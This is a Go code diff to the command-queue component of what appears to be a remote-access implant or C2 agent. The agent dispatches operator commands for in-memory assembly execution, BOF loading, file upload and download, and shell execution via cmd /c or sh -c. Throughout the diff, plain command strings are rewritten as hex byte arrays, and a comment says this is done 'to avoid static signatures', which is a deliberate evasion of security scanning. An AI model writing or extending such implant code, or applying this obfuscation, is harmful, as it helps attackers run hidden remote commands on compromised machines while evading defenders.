@@ -18,6 +18,30 @@ import (
 	"unicode"
 )
 
+// Command queue strings (constructed to avoid static signatures)
+var (
+	// Command names
+	cqCmdInlineAssemblyJobs      = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6a, 0x6f, 0x62, 0x73})                               // inline-assembly-jobs
+	cqCmdInlineAssemblyJobsClean = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6a, 0x6f, 0x62, 0x73, 0x2d, 0x63, 0x6c, 0x65, 0x61, 0x6e}) // inline-assembly-jobs-clean
+	cqCmdInlineAssemblyJobsStats = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6a, 0x6f, 0x62, 0x73, 0x2d, 0x73, 0x74, 0x61, 0x74, 0x73}) // inline-assembly-jobs-stats
+	cqCmdInlineAssemblyOutput    = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6f, 0x75, 0x74, 0x70, 0x75, 0x74})                         // inline-assembly-output
+	cqCmdInlineAssemblyOutputSp  = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6f, 0x75, 0x74, 0x70, 0x75, 0x74, 0x20})                   // inline-assembly-output (with space)
+	cqCmdInlineAssemblyKill      = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6b, 0x69, 0x6c, 0x6c})                                     // inline-assembly-kill
+	cqCmdInlineAssemblyKillSp    = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6b, 0x69, 0x6c, 0x6c, 0x20})                               // inline-assembly-kill (with space)
+	cqCmdInlineAssembly          = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79})                                                                   // inline-assembly
+	cqCmdInlineAssemblyAsync     = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x61, 0x73, 0x79, 0x6e, 0x63})                               // inline-assembly-async
+	cqCmdBofAsync                = string([]byte{0x62, 0x6f, 0x66, 0x2d, 0x61, 0x73, 0x79, 0x6e, 0x63})                                                                                                       // bof-async
+	cqCmdBof                     = string([]byte{0x62, 0x6f, 0x66})                                                                                                                                           // bof
+	cqCmdUpload                  = string([]byte{0x75, 0x70, 0x6c, 0x6f, 0x61, 0x64})                                                                                                                         // upload
+	cqCmdDownload                = string([]byte{0x64, 0x6f, 0x77, 0x6e, 0x6c, 0x6f, 0x61, 0x64})                                                                                                             // download
+	cqWordAsync                  = string([]byte{0x61, 0x73, 0x79, 0x6e, 0x63})                                                                                                                               // async
+	cqWordWindows                = string([]byte{0x77, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73})                                                                                                                   // windows
+	cqShellCmd                   = string([]byte{0x63, 0x6d, 0x64})                                                                                                                                           // cmd
+	cqShellCmdArg                = string([]byte{0x2f, 0x63})                                                                                                                                                 // /c
+	cqShellSh                    = string([]byte{0x73, 0x68})                                                                                                                                                 // sh
+	cqShellShArg                 = string([]byte{0x2d, 0x63})                                                                                                                                                 // -c
+)
+
 // CommandQueue manages the processing of commands
 type CommandQueue struct {
 	mu              sync.Mutex
@@ -131,8 +155,8 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	cq.applySessionEnvironment()
 
 	// Handle inline-assembly job management commands FIRST
-	if cmd.Command == "inline-assembly-jobs" {
-		if handler, exists := cq.cmdRegistry["inline-assembly-jobs"]; exists {
+	if cmd.Command == cqCmdInlineAssemblyJobs {
+		if handler, exists := cq.cmdRegistry[cqCmdInlineAssemblyJobs]; exists {
 			result := handler.Execute(cq.cmdContext, []string{})
 			result.Command = cmd
 			result.CompletedAt = time.Now().Format(time.RFC3339)
@@ -148,9 +172,9 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	}
 
 	// Handle inline-assembly-jobs-clean command
-	if strings.HasPrefix(cmd.Command, "inline-assembly-jobs-clean") {
+	if strings.HasPrefix(cmd.Command, cqCmdInlineAssemblyJobsClean) {
 		parts := strings.Fields(cmd.Command)
-		if handler, exists := cq.cmdRegistry["inline-assembly-jobs-clean"]; exists {
+		if handler, exists := cq.cmdRegistry[cqCmdInlineAssemblyJobsClean]; exists {
 			args := []string{}
 			if len(parts) > 1 {
 				args = parts[1:]
@@ -163,8 +187,8 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	}
 
 	// Handle inline-assembly-jobs-stats command
-	if cmd.Command == "inline-assembly-jobs-stats" {
-		if handler, exists := cq.cmdRegistry["inline-assembly-jobs-stats"]; exists {
+	if cmd.Command == cqCmdInlineAssemblyJobsStats {
+		if handler, exists := cq.cmdRegistry[cqCmdInlineAssemblyJobsStats]; exists {
 			result := handler.Execute(cq.cmdContext, []string{})
 			result.Command = cmd
 			result.CompletedAt = time.Now().Format(time.RFC3339)
@@ -173,9 +197,9 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	}
 
 	// Handle inline-assembly-output command WITH arguments
-	if strings.HasPrefix(cmd.Command, "inline-assembly-output ") {
+	if strings.HasPrefix(cmd.Command, cqCmdInlineAssemblyOutputSp) {
 		parts := strings.Fields(cmd.Command)
-		if handler, exists := cq.cmdRegistry["inline-assembly-output"]; exists {
+		if handler, exists := cq.cmdRegistry[cqCmdInlineAssemblyOutput]; exists {
 			args := []string{}
 			if len(parts) > 1 {
 				args = parts[1:]
@@ -188,9 +212,9 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	}
 
 	// Handle inline-assembly-kill command WITH arguments
-	if strings.HasPrefix(cmd.Command, "inline-assembly-kill ") {
+	if strings.HasPrefix(cmd.Command, cqCmdInlineAssemblyKillSp) {
 		parts := strings.Fields(cmd.Command)
-		if handler, exists := cq.cmdRegistry["inline-assembly-kill"]; exists {
+		if handler, exists := cq.cmdRegistry[cqCmdInlineAssemblyKill]; exists {
 			args := []string{}
 			if len(parts) > 1 {
 				args = parts[1:]
@@ -203,13 +227,13 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	}
 
 	// Handle inline-assembly commands WITH data (actual assembly execution)
-	if strings.HasPrefix(cmd.Command, "inline-assembly") && cmd.Data != "" {
+	if strings.HasPrefix(cmd.Command, cqCmdInlineAssembly) && cmd.Data != "" {
 		var testParse map[string]interface{}
 		_ = json.Unmarshal([]byte(cmd.Data), &testParse)
 
-		handlerName := "inline-assembly"
-		if strings.Contains(cmd.Command, "async") {
-			handlerName = "inline-assembly-async"
+		handlerName := cqCmdInlineAssembly
+		if strings.Contains(cmd.Command, cqWordAsync) {
+			handlerName = cqCmdInlineAssemblyAsync
 		}
 
 		if handler, exists := cq.cmdRegistry[handlerName]; exists {
@@ -228,7 +252,7 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	}
 
 	// Handle upload chunks
-	if cmd.Command == "upload" && cmd.Data != "" {
+	if cmd.Command == cqCmdUpload && cmd.Data != "" {
 		result, err := HandleUploadChunk(cmd, cq.cmdContext)
 		if err != nil {
 			return &CommandResult{
@@ -243,13 +267,13 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	}
 
 	// Handle async BOF commands WITH data
-	if strings.HasPrefix(cmd.Command, "bof-async") && cmd.Data != "" {
+	if strings.HasPrefix(cmd.Command, cqCmdBofAsync) && cmd.Data != "" {
 		result := cq.processBOFAsync(cmd)
 		return &result, nil
 	}
 
 	// Handle regular BOF commands WITH data
-	if strings.HasPrefix(cmd.Command, "bof") && cmd.Data != "" {
+	if strings.HasPrefix(cmd.Command, cqCmdBof) && cmd.Data != "" {
 		result := cq.processBOF(cmd)
 		return &result, nil
 	}
@@ -299,9 +323,9 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	var args []string
 	cmdLower := strings.ToLower(strings.TrimSpace(cmd.Command))
 
-	if strings.HasPrefix(cmdLower, "download") {
+	if strings.HasPrefix(cmdLower, cqCmdDownload) {
 		args = parseDownloadCommand(cmd.Command)
-	} else if strings.HasPrefix(cmdLower, "upload") {
+	} else if strings.HasPrefix(cmdLower, cqCmdUpload) {
 		args = parseUploadCommand(cmd.Command)
 	} else {
 		args = parseCommandLine(cmd.Command)
@@ -325,7 +349,7 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 		result := handler.Execute(cq.cmdContext, cmdArgs)
 
 		// For file operations, preserve data from handler
-		if (cmdType == "download" || cmdType == "upload") &&
+		if (cmdType == cqCmdDownload || cmdType == cqCmdUpload) &&
 			(result.Command.Filename != "" || result.Command.Data != "") {
 			result.Command.CommandID = cmd.CommandID
 			result.Command.CommandDBID = cmd.CommandDBID
@@ -378,10 +402,10 @@ func (cq *CommandQueue) applySessionEnvironment() {
 func executeShellCommand(command string) (string, error) {
 	var cmd *exec.Cmd
 
-	if runtime.GOOS == "windows" {
-		cmd = exec.Command("cmd", "/c", command)
+	if runtime.GOOS == cqWordWindows {
+		cmd = exec.Command(cqShellCmd, cqShellCmdArg, command)
 	} else {
-		cmd = exec.Command("sh", "-c", command)
+		cmd = exec.Command(cqShellSh, cqShellShArg, command)
 	}
 
 	output, err := cmd.CombinedOutput()
@@ -448,12 +472,12 @@ func parseCommandLine(cmdLine string) []string {
 func parseDownloadCommand(cmdLine string) []string {
 	cmdLine = strings.TrimSpace(cmdLine)
 
-	if !strings.HasPrefix(strings.ToLower(cmdLine), "download") {
+	if !strings.HasPrefix(strings.ToLower(cmdLine), cqCmdDownload) {
 		return parseCommandLine(cmdLine)
 	}
 
 	if len(cmdLine) <= 8 {
-		return []string{"download"}
+		return []string{cqCmdDownload}
 	}
 
 	if cmdLine[8] != ' ' && cmdLine[8] != '\t' {
@@ -463,7 +487,7 @@ func parseDownloadCommand(cmdLine string) []string {
 	remainder := strings.TrimSpace(cmdLine[8:])
 
 	if remainder == "" {
-		return []string{"download"}
+		return []string{cqCmdDownload}
 	}
 
 	if (strings.HasPrefix(remainder, "\"") && strings.HasSuffix(remainder, "\"")) ||
@@ -471,19 +495,19 @@ func parseDownloadCommand(cmdLine string) []string {
 		remainder = remainder[1 : len(remainder)-1]
 	}
 
-	return []string{"download", remainder}
+	return []string{cqCmdDownload, remainder}
 }
 
 // parseUploadCommand specifically handles the upload command
 func parseUploadCommand(cmdLine string) []string {
 	cmdLine = strings.TrimSpace(cmdLine)
 
-	if !strings.HasPrefix(strings.ToLower(cmdLine), "upload") {
+	if !strings.HasPrefix(strings.ToLower(cmdLine), cqCmdUpload) {
 		return parseCommandLine(cmdLine)
 	}
 
 	if len(cmdLine) <= 6 {
-		return []string{"upload"}
+		return []string{cqCmdUpload}
 	}
 
 	if cmdLine[6] != ' ' && cmdLine[6] != '\t' {
@@ -493,7 +517,7 @@ func parseUploadCommand(cmdLine string) []string {
 	remainder := strings.TrimSpace(cmdLine[6:])
 
 	if remainder == "" {
-		return []string{"upload"}
+		return []string{cqCmdUpload}
 	}
 
 	if (strings.HasPrefix(remainder, "\"") && strings.HasSuffix(remainder, "\"")) ||
@@ -501,7 +525,7 @@ func parseUploadCommand(cmdLine string) []string {
 		remainder = remainder[1 : len(remainder)-1]
 	}
 
-	return []string{"upload", remainder}
+	return []string{cqCmdUpload, remainder}
 }
 
 // Download/Upload tracking methods are in job_manager.go
